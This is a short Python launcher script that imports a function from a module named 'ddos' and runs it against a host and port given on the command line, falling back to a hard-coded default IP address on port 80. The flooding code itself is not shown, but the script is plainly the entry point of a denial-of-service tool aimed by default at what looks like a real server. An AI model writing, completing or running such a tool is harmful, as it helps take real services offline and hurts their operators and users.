from ddos import main as ddos

import sys



def start():
  try: host = sys.argv[1]
  except: host = '77.88.55.55'

  try: port = sys.argv[2]
  except: port = 80
  ddos(_host=host, _port=port)



if __name__ == '__main__':
  start()